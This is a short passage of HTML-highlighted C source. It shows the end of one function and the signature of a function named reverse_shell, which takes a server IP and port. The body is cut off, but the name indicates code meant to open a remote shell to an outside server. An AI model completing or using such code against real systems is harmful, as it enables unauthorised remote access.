    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-type">void</span> <span class="hljs-title function_">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *server_ip, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *server_port)</span> {
